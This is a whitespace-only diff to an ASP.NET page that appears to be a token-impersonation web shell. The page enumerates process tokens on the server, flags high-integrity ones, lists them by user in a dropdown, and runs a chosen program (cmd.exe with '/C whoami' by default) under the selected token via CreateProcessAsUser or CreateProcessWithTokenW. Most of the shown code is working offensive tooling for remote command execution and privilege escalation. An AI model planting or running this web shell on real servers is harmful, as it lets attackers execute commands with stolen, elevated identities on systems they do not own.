@@ -252,13 +252,13 @@
 	    System.Text.StringBuilder pReferencedDomainName,
 	    ref uint cchReferencedDomainName,
 	    out SID_NAME_USE peUse);
-		
+
 	[DllImport("advapi32.dll", SetLastError=true, CharSet=CharSet.Unicode)]
 	public static extern bool CreateProcessAsUser(IntPtr hToken, string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, CreationFlags dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
 
 	[DllImport("advapi32", SetLastError = true, CharSet = CharSet.Unicode)]
 	public static extern bool CreateProcessWithTokenW(IntPtr hToken, LogonFlags dwLogonFlags, string lpApplicationName, string lpCommandLine, CreationFlags dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
-	
+
 	protected void RunThings (object sender, EventArgs e)
 	{
 		string id = Request.Form["DropdownList"];
@@ -304,9 +304,9 @@
 		}
 
 		if (!CreateAsUser(hPrimaryToken, file, String.Concat(" ", args), IntPtr.Zero, IntPtr.Zero, true, CreationFlags.NoConsole, IntPtr.Zero, Path.GetDirectoryName(file), si, pi))
-		{	      
+		{
 			if (!CreateWithToken(hPrimaryToken, 0, file, String.Concat(" ", args), CreationFlags.NoConsole, IntPtr.Zero, Path.GetDirectoryName(file), si, pi))
-			{		
+			{
 				Response.Write("Error: " + Marshal.GetLastWin32Error());
 				CloseHandle(hPrimaryToken);
 				return;
@@ -374,7 +374,7 @@
 	}
 
 	public bool CreateWithToken(IntPtr hPrimaryToken, LogonFlags dwLogonFlags, string file, string args, CreationFlags dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, STARTUPINFO si, PROCESS_INFORMATION pi)
-	{   
+	{
 		bool retVal;
 		IntPtr htok = IntPtr.Zero;
 		retVal = OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, ref htok);
@@ -395,7 +395,7 @@
 	{
 		DropDownList.Items.Clear();
 		List<string> users = new List<string>();
-		GetAllUsernames(users); 
+		GetAllUsernames(users);
 	}
 
 	public void GetAllUsernames(List<string> users)
@@ -416,7 +416,7 @@
 
 	                if (string.Format("{0:X}", status) == "C0000008") // STATUS_INVALID_HANDLE
 	                    continue;
-	                
+
 	                while (status != 0)
 	                {
 	                    Marshal.FreeHGlobal(hObjectName);
@@ -484,20 +484,20 @@
 
 	                                // From https://www.pinvoke.net/default.aspx/Constants/SECURITY_MANDATORY.html
 	                                IntPtr pb = Marshal.AllocCoTaskMem(1000);
-	                                try 
+	                                try
 	                                {
 	                                    int cb = 1000;
-	                                    if (GetTokenInformation(handle, TOKEN_INFORMATION_CLASS.TokenIntegrityLevel, pb, cb, out cb)) 
+	                                    if (GetTokenInformation(handle, TOKEN_INFORMATION_CLASS.TokenIntegrityLevel, pb, cb, out cb))
 	                                    {
 	                                        IntPtr pSid = Marshal.ReadIntPtr(pb);
 
 	                                        int dwIntegrityLevel = Marshal.ReadInt32(GetSidSubAuthority(pSid, (int)(Marshal.ReadByte(GetSidSubAuthorityCount(pSid)) - 1U)));
 
-	                                        if (dwIntegrityLevel >= SECURITY_MANDATORY_HIGH_RID) 
+	                                        if (dwIntegrityLevel >= SECURITY_MANDATORY_HIGH_RID)
 	                                            userName += " (+)";
 	                                    }
 	                                }
-	                                finally 
+	                                finally
 	                                {
 	                                    Marshal.FreeCoTaskMem(pb);
 	                                }
@@ -525,14 +525,14 @@
 	            {
 	                Marshal.FreeHGlobal(hObjectName);
 	            }
-	            
+
 	        }
 	    }
-	    catch (Exception) { }   
+	    catch (Exception) { }
 
-	    return;         
+	    return;
 	}
-        
+
 </script>
 
 
@@ -543,18 +543,18 @@
 <title>Test</title>
 </head>
 <body>
-    <form id="form1" runat="server">  
-        <div class="div" align="center">  
-        <br/><br/>  
-            <asp:DropDownList ID="DropDownList" name="dropdown" runat="server" width="250px" >  
+    <form id="form1" runat="server">
+        <div class="div" align="center">
+        <br/><br/>
+            <asp:DropDownList ID="DropDownList" name="dropdown" runat="server" width="250px" >
             </asp:DropDownList>
             <input type="text" name="file" style='width:23em' value="c:\windows\system32\cmd.exe" />
-            <asp:Button ID="run" runat="server" style='width:6em' Text="Run" onClick="RunThings" /> 
-            <asp:Button ID="refresh" runat="server" Text="Get Tokens" onClick="Refresh"/> 
-            <br> 
+            <asp:Button ID="run" runat="server" style='width:6em' Text="Run" onClick="RunThings" />
+            <asp:Button ID="refresh" runat="server" Text="Get Tokens" onClick="Refresh"/>
+            <br>
             <input type="text" name="args" style='width:55em' value="/C whoami"  />
-        </div>  
-    </form> 
+        </div>
+    </form>
 
 <style>
     div.justified {
@@ -574,5 +574,5 @@
 
 </body>
 </html>
- 
- 
+
+
